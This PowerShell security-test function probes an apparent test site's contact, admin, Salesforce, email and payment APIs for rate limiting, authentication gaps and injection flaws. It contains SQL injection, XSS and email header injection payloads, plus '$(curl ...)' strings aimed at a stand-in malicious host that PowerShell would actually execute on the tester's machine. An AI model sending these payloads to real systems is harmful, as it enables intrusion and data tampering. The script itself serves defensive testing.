# API Security Test
# Tests Salesforce integration, payment APIs, email/SMS services for security vulnerabilities

function Test-APISecurity {
    param(
        [string]$BaseUrl = "https://test.kineticev.in",
        [switch]$Verbose
    )
    
    Write-Host "🌐 Testing API Security..." -ForegroundColor Cyan
    
    $Results = @()
    
    # Test 1: Rate Limiting
    Write-Host "`n📋 Testing API Rate Limiting..." -ForegroundColor Yellow
    
    $RateLimitHit = $false
    $RequestCount = 0
    
    for ($i = 1; $i -le 25; $i++) {
        $Body = @{
            full_name = "RateTest$i"
            email = "ratetest$i@test.com"
            phone = "123456789$i"
            help_type = "General"
            message = "Rate limit test $i"
        }
        
        try {
            $StartTime = Get-Date
            $Response = Invoke-RestMethod -Uri "$BaseUrl/api/submit-contact" -Method Post -Body $Body -TimeoutSec 5 -ErrorAction SilentlyContinue
            $EndTime = Get-Date
            $RequestCount++
            
            if ($Verbose -and $i % 5 -eq 0) {
                Write-Host "  Request $i - Success" -ForegroundColor Green
            }
            
        } catch {
            $StatusCode = $_.Exception.Response.StatusCode.Value__
            if ($StatusCode -eq 429) {
                $RateLimitHit = $true
                Write-Host "  ✅ Rate limit activated at request $i" -ForegroundColor Green
                break
            } elseif ($StatusCode -in @(503, 502)) {
                # Server overload - also indicates rate limiting
                $RateLimitHit = $true
                Write-Host "  ✅ Server protection activated at request $i" -ForegroundColor Green
                break
            }
        }
        
        Start-Sleep -Milliseconds 100
    }
    
    $Results += [PSCustomObject]@{
        Test = "API Rate Limiting"
        StatusCode = if ($RateLimitHit) { 429 } else { 200 }
        Passed = $RateLimitHit
        Details = if ($RateLimitHit) { "Rate limiting active after $RequestCount requests" } else { "No rate limiting detected after $RequestCount requests" }
        Category = "Rate Limiting"
    }
    
    # Test 2: API Authentication
    Write-Host "`n📋 Testing API Authentication..." -ForegroundColor Yellow
    
    $APIEndpoints = @(
        "/api/admin/users",
        "/api/admin/analytics",
        "/api/database/backup",
        "/api/config/update"
    )
    
    foreach ($Endpoint in $APIEndpoints) {
        try {
            $Response = Invoke-WebRequest -Uri "$BaseUrl$Endpoint" -Method Get -TimeoutSec 5 -ErrorAction SilentlyContinue
            $StatusCode = $Response.StatusCode
            
            # API endpoints should require authentication
            $Passed = $false
            $Status = "❌ EXPOSED"
            $Details = "API endpoint accessible without authentication"
            
        } catch {
            $StatusCode = $_.Exception.Response.StatusCode.Value__
            # 401, 403, or 404 are good responses
            $Passed = ($StatusCode -in @(401, 403, 404))
            $Status = if ($Passed) { "✅ PROTECTED" } else { "⚠️ OTHER" }
            $Details = "API endpoint returned $StatusCode"
        }
        
        $Results += [PSCustomObject]@{
            Test = "API Authentication - $Endpoint"
            StatusCode = $StatusCode
            Passed = $Passed
            Details = $Details
            Category = "API Authentication"
        }
    }
    
    # Test 3: Salesforce Integration Security
    Write-Host "`n📋 Testing Salesforce Integration Security..." -ForegroundColor Yellow
    
    # Test Salesforce injection
    $SalesforcePayloads = @(
        "test@test.com'; DROP TABLE Lead;--",
        "<script>alert('xss')</script>",
        "$(curl -X POST https://malicious-site.com)",
        "test@test.com%0D%0ABcc:attacker@evil.com"
    )
    
    foreach ($Payload in $SalesforcePayloads[0..1]) { # Test key payloads
        $Body = @{
            full_name = "Test User"
            email = $Payload
            phone = "1234567890"
            help_type = "General"
            message = "Salesforce security test"
        }
        
        try {
            $Response = Invoke-RestMethod -Uri "$BaseUrl/api/submit-contact" -Method Post -Body $Body -TimeoutSec 10 -ErrorAction SilentlyContinue
            
            # Check if malicious payload was processed
            $Vulnerable = $false
            if ($Response) {
                $ResponseText = $Response | ConvertTo-Json
                $Vulnerable = $ResponseText -match "success" -and $ResponseText -notmatch "(blocked|invalid|error)"
            }
            
            $Passed = -not $Vulnerable
            $Status = if ($Passed) { "✅ FILTERED" } else { "❌ VULNERABLE" }
            $Details = if ($Vulnerable) { "Malicious payload sent to Salesforce" } else { "Salesforce payload filtered" }
            
        } catch {
            $StatusCode = $_.Exception.Response.StatusCode.Value__
            $Passed = ($StatusCode -in @(400, 422))
            $Status = if ($Passed) { "✅ REJECTED" } else { "⚠️ OTHER" }
            $Details = "Salesforce integration returned $StatusCode"
        }
        
        $Results += [PSCustomObject]@{
            Test = "Salesforce Injection Protection"
            StatusCode = if ($Response) { 200 } else { $StatusCode }
            Passed = $Passed
            Details = $Details
            Category = "Salesforce Security"
        }
    }
    
    # Test 4: Email/SMS Injection
    Write-Host "`n📋 Testing Email/SMS Injection..." -ForegroundColor Yellow
    
    $EmailInjectionPayloads = @(
        "test@test.com%0D%0ABcc:attacker@evil.com",
        "test@test.com\nBcc:attacker@evil.com",
        "test@test.com%0ASubject:Spam"
    )
    
    foreach ($Payload in $EmailInjectionPayloads[0..1]) {
        $Body = @{
            full_name = "Test User"
            email = $Payload
            phone = "1234567890"
            help_type = "General"
            message = "Email injection test"
        }
        
        try {
            $Response = Invoke-RestMethod -Uri "$BaseUrl/api/submit-contact" -Method Post -Body $Body -TimeoutSec 10 -ErrorAction SilentlyContinue
            
            $Passed = $false # If it accepts the payload, it's vulnerable
            $Status = "❌ VULNERABLE"
            $Details = "Email injection payload was accepted"
            
        } catch {
            $StatusCode = $_.Exception.Response.StatusCode.Value__
            $Passed = ($StatusCode -in @(400, 422))
            $Status = if ($Passed) { "✅ FILTERED" } else { "⚠️ OTHER" }
            $Details = "Email injection payload returned $StatusCode"
        }
        
        $Results += [PSCustomObject]@{
            Test = "Email Header Injection"
            StatusCode = if ($Response) { 200 } else { $StatusCode }
            Passed = $Passed
            Details = $Details
            Category = "Email Security"
        }
    }
    
    # Test 5: Payment API Security
    Write-Host "`n📋 Testing Payment API Security..." -ForegroundColor Yellow
    
    try {
        # Test payment endpoint without proper data
        $Body = @{
            amount = "'; DROP TABLE payments;--"
            customer_id = "<script>alert('xss')</script>"
            vehicle_variant = "$(curl malicious-site.com)"
        }
        
        $Response = Invoke-RestMethod -Uri "$BaseUrl/api/payment/initiate" -Method Post -Body $Body -TimeoutSec 10 -ErrorAction SilentlyContinue
        
        $Passed = $false # Should not accept malicious payment data
        $Status = "❌ VULNERABLE"
        $Details = "Payment API accepted malicious data"
        
    } catch {
        $StatusCode = $_.Exception.Response.StatusCode.Value__
        # Should reject malicious payment data
        $Passed = ($StatusCode -in @(400, 401, 403, 422))
        $Status = if ($Passed) { "✅ PROTECTED" } else { "⚠️ OTHER" }
        $Details = "Payment API returned $StatusCode for malicious data"
    }
    
    $Results += [PSCustomObject]@{
        Test = "Payment API Injection Protection"
        StatusCode = if ($Response) { 200 } else { $StatusCode }
        Passed = $Passed
        Details = $Details
        Category = "Payment Security"
    }
    
    # Test 6: API Response Security
    Write-Host "`n📋 Testing API Response Security..." -ForegroundColor Yellow
    
    try {
        $Response = Invoke-RestMethod -Uri "$BaseUrl/api/submit-contact" -Method Post -Body @{
            full_name = "Test User"
            email = "test@test.com"
            phone = "1234567890"
            help_type = "General"
            message = "Response security test"
        } -TimeoutSec 10 -ErrorAction SilentlyContinue
        
        $ResponseText = $Response | ConvertTo-Json
        
        # Check for sensitive information leakage
        $SensitiveDataExposed = $ResponseText -match "(password|token|key|secret|database|sql)" -and 
                               $ResponseText -notmatch "(message|success|error|status)"
        
        $Passed = -not $SensitiveDataExposed
        $Status = if ($Passed) { "✅ SECURE" } else { "❌ LEAKING" }
        $Details = if ($SensitiveDataExposed) { "API response contains sensitive information" } else { "API response is clean" }
        
    } catch {
        $StatusCode = $_.Exception.Response.StatusCode.Value__
        $Passed = $true # Error responses are generally safe
        $Status = "✅ SECURE"
        $Details = "API returned error response $StatusCode"
    }
    
    $Results += [PSCustomObject]@{
        Test = "API Response Information Disclosure"
        StatusCode = if ($Response) { 200 } else { $StatusCode }
        Passed = $Passed
        Details = $Details
        Category = "Information Disclosure"
    }
    
    # Summary
    $PassedTests = ($Results | Where-Object { $_.Passed }).Count
    $FailedTests = ($Results | Where-Object { -not $_.Passed }).Count
    $TotalTests = $Results.Count
    
    Write-Host "`n📊 API Security Summary:" -ForegroundColor Cyan
    Write-Host "Total Tests: $TotalTests" -ForegroundColor White
    Write-Host "Passed: $PassedTests" -ForegroundColor Green
    Write-Host "Failed: $FailedTests" -ForegroundColor Red
    Write-Host "Success Rate: $([math]::Round(($PassedTests / $TotalTests) * 100, 2))%" -ForegroundColor Cyan
    
    return @{
        Results = $Results
        Summary = @{
            Total = $TotalTests
            Passed = $PassedTests
            Failed = $FailedTests
            SuccessRate = [math]::Round(($PassedTests / $TotalTests) * 100, 2)
        }
        Passed = ($FailedTests -eq 0)
    }
}

# Export function for module use
Export-ModuleMember -Function Test-APISecurity